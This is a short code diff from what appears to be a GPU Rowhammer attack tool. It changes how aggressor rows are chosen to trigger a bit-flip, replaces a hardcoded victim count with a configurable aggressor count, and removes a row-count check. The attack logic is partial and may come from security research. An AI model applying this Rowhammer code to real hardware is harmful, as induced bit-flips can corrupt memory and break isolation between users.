@@ -87,7 +87,7 @@ hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
   auto& agg_vec = ctx.step2_data.agg_vec;
   uint8_t *layout = (uint8_t *)alloc_ptrs[0];
 
-  const uint64_t num_victim = 23;
+  const uint64_t num_agg = ctx.bitflip_config.num_agg;
   const uint64_t step = 256;
   const uint64_t min_rowId = 30016 - 94;
   const uint64_t max_rowId = 30016 + 5;
@@ -106,19 +106,11 @@ hardcoded_rowhammer_bitflip_page (GPUBreachContext &ctx)
   RowList rows = read_row_from_file (row_set_file, layout);
   row_set_file.close ();
 
-  if ((int64_t)(rows.size () - 2 * num_victim - 1) < 0)
-    {
-      std::cout << "Error: "
-                << "Not enough rows to generate the specified victims."
-                << '\n';
-      exit (-1);
-    }
-
   /* Get Target Aggressors That Trigger the Bit-flip */
   std::vector<uint64_t> target_agg;
   std::vector<uint64_t> all_vics (num_rows);
   std::iota (all_vics.begin (), all_vics.end (), 0);
-  target_agg = get_aggressors (rows, min_rowId, num_victim + 1, row_step);
+  target_agg = get_aggressors (rows, min_rowId, num_agg, row_step);
 
   // The first page to reserve required for Rowhammer Attack
   uint64_t first_hammer_page
